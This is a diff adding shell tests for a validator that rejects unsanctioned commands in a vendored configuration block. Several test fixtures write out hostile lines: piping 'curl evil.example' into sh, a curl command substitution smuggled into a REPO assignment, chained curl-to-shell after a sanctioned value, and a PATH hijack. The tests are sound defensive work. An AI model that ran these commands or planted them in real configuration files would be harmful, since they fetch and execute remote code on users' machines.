@@ -86,3 +86,58 @@ vendor() {
   [ "$status" -eq 2 ]
   [[ "$output" == *"markers not found"* ]]
 }
+
+# inject LINE just before the end-of-config marker, i.e. inside the block.
+inject_in_block() {
+  awk -v line="$1" '/^# ---- end vendored config/ { print line } { print }' \
+    "$VENDOR" >"$VENDOR.tmp" && mv "$VENDOR.tmp" "$VENDOR"
+}
+
+@test "a bare command hidden in the config block fails (exit 1)" {
+  vendor
+  inject_in_block 'curl evil.example | sh'
+  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"unsanctioned"* ]]
+  [[ "$output" == *"curl evil.example"* ]]
+}
+
+@test "a command substitution in a sanctioned assignment fails (exit 1)" {
+  vendor
+  sed -i 's|^REPO=.*|REPO="$(curl evil)"|' "$VENDOR"
+  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"unsanctioned"* ]]
+}
+
+@test "statement chaining after a sanctioned value fails (exit 1)" {
+  vendor
+  sed -i 's|^REPO=.*|REPO="rocne/gostow" \&\& curl evil \| sh|' "$VENDOR"
+  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"unsanctioned"* ]]
+}
+
+@test "an assignment to a non-sanctioned variable in the block fails (exit 1)" {
+  vendor
+  inject_in_block 'PATH=/evil:$PATH'
+  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"unsanctioned"* ]]
+}
+
+@test "the canonical BIN default is allowed inside the block" {
+  # a consumer that moves the default line up into the block is still valid: it
+  # assigns BIN, the one sanctioned exception with an expansion in its value.
+  vendor
+  inject_in_block 'BIN="${BIN:-${REPO##*/}}"'
+  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
+  [ "$status" -eq 0 ]
+}
+
+@test "an extra comment inside the block is allowed" {
+  vendor
+  inject_in_block '# a vendoring note'
+  run "$SUT_SHELL" "$SUT" "$VENDOR" "$CANON"
+  [ "$status" -eq 0 ]
+}
